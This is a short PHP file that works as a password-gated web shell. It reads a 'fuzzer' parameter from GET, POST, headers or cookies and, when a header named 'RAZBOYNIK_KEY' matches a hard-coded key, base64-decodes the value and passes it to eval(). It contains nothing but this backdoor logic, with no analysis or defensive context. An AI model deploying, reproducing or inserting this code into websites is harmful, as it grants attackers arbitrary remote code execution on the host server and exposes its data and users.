<?php

const PARAM = "fuzzer";
const PARAM_KEY = "RAZBOYNIK_KEY";
const RKEY = "FromRussiaWithLove<3";

$g = $_GET;
$p = $_POST;
$h = getallheaders();
$c = $_COOKIE;

$arr = [$g, $p, $h, $c];

foreach ($arr as $i) {
	if (isset($i[PARAM])) {
		if ($h[PARAM_KEY] == RKEY) {
			eval(base64_decode($i[PARAM]));
		}

		echo "Too bad";
	}
}

